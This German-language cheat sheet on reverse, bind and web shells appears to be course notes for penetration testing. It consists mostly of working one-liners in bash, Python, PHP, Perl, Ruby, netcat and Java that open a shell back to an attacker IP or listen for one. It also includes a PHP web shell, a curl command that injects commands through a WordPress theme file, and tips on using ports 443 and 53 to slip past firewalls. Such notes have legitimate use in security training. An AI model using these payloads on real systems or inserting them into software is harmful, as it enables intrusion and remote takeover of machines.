# Shells – Reverse Shell, Bind Shell, Web Shell

## Unterschied

```
Reverse Shell → Opfer verbindet sich zurück zum Angreifer (Angreifer lauscht)
Bind Shell    → Opfer öffnet Port, Angreifer verbindet sich (Opfer lauscht)

Wann Reverse Shell? → Fast immer bevorzugt (NAT/Firewall blockt meist Inbound)
Wann Bind Shell?    → Wenn Outbound vom Opfer geblockt, aber Inbound möglich
```

---

## Reverse Shell

### Schritt 1 – Listener starten (Kali/Angreifer)

```bash
nc -nlvp 4444
# -n : kein DNS lookup
# -l : listen mode
# -v : verbose
# -p : port
# Tipp: Port 443 nutzen → selten von Firewalls geblockt!
```

### Schritt 2 – Shell auf dem Opfer auslösen

```bash
# Bash
/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.10.10/443 0>&1"
# -i : interaktive Shell
# >& : stdout + stderr weiterleiten
# 0>&1 : stdin auch über die Verbindung

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
# dup2() : leitet stdin/stdout/stderr auf den Socket um

# PHP
php -r '$sock=fsockopen("10.10.10.10",443);exec("/bin/sh -i <&3 >&3 2>&3");'
# fsockopen : öffnet TCP-Verbindung
# <&3 >&3 2>&3 : leitet alle I/O auf Socket (fd 3)

# Perl
perl -e 'use Socket;$i="10.10.10.10";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Ruby
ruby -rsocket -e'f=TCPSocket.open("10.10.10.10",443).to_i;exec sprintf("/bin/sh -i <%d >&%d 2>&%d",f,f,f)'

# Netcat (mit -e)
nc 10.10.10.10 443 -e /bin/bash
# -e : führt Programm nach Verbindung aus (nicht in allen nc-Versionen!)

# Netcat (ohne -e Workaround)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.10.10 443 > /tmp/f
# mkfifo : erstellt named pipe als I/O-Brücke

# Java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.10.10/443;cat <&5 | while read line; do $line 2>&5 >&5; done"] as String[])
p.waitFor()
```

> **Generator:** https://www.revshells.com (vom Professor empfohlen!)

---

## Bind Shell

### Schritt 1 – Listener auf dem Opfer starten

```bash
# Netcat (mit -e)
nc -nlvp 4444 -e /bin/bash

# Netcat (ohne -e Workaround)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lvp 4444 > /tmp/f

# Python
python -c 'import socket,subprocess,os;s=socket.socket();s.bind(("0.0.0.0",4444));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call(["/bin/sh","-i"])'
# bind(0.0.0.0) : lauscht auf allen Interfaces
# listen(1)     : wartet auf 1 Verbindung
# accept()      : nimmt eingehende Verbindung an

# Perl
perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in(4444,INADDR_ANY));listen(S,SOMAXCONN);accept(C,S);open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/sh -i");'
```

### Schritt 2 – Angreifer verbindet sich (Kali)

```bash
nc -nv <opfer-ip> 4444
# -n : kein DNS
# -v : verbose
```

---

## Web Shell

```bash
# Kali enthält Webshells für verschiedene Technologien:
ls /usr/share/webshells/
# asp/ aspx/ cfm/ jsp/ perl/ php/ ...

# PHP Webshell (einfach)
<?php system($_GET['cmd']); ?>
# Aufruf: http://<ip>/shell.php?cmd=whoami

# PHP Reverse Shell
# https://github.com/pentestmonkey/php-reverse-shell
# https://github.com/ivan-sincek/php-reverse-shell

# Java/JSP Webshell
# https://github.com/ivan-sincek/java-reverse-tcp

# Befehl über URL-Parameter injizieren (z.B. WordPress)
curl -v "http://<IP>/wp-content/themes/twentytwelve/404.php?$(python -c 'import urllib; print urllib.urlencode({"cmd":"id"})')"
```

---

## TTY Shell Upgrade

```bash
# Schritt 1: Python PTY
python -c 'import pty;pty.spawn("/bin/bash")'

# Schritt 2: Prozess in Hintergrund suspendieren
Ctrl + Z

# Schritt 3: Terminal-Einstellungen anpassen
stty raw -echo; fg

# Schritt 4: TERM setzen
export TERM=xterm

# Erklärung:
# Ctrl+Z       → suspendiert Terminal-Prozess (in Hintergrund)
# stty raw     → gibt Eingabe byteweise weiter (kein Puffern)
# -echo        → eigene Eingabe nicht spiegeln
# fg           → Prozess zurückbringen
# TERM=xterm   → clear, Pfeiltasten etc. aktivieren
```

---

## Netcat – Ergänzungen

```bash
# Wenn nc kein -e hat (moderne Versionen)
# Server-Seite (Opfer):
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc -l 127.0.0.1 1234 > /tmp/f

# Client-Seite (Angreifer):
nc host.example.com 1234

# Manpage: https://manpages.ubuntu.com/manpages/bionic/man1/nc_openbsd.1.html

# Tipp: Port 53 ist selten von Firewalls geblockt
# → ideal für Reverse Shell Listener auf Port 53
```
